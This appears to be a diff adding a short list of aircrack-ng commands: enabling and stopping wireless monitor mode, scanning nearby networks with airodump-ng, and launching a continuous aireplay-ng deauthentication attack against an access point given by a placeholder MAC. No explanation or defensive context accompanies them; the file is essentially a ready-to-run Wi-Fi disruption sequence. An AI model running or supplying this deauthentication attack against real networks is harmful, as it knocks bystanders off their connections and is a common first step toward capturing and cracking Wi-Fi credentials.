@@ -1,0 +1,4 @@
+sudo airmon-ng start wlan0
+sudo airmon-ng stop wlan0mon
+sudo airodump-ng wlan0mon
+sudo aireplay-ng --deauth 0 -a <MAC> wlan0mon
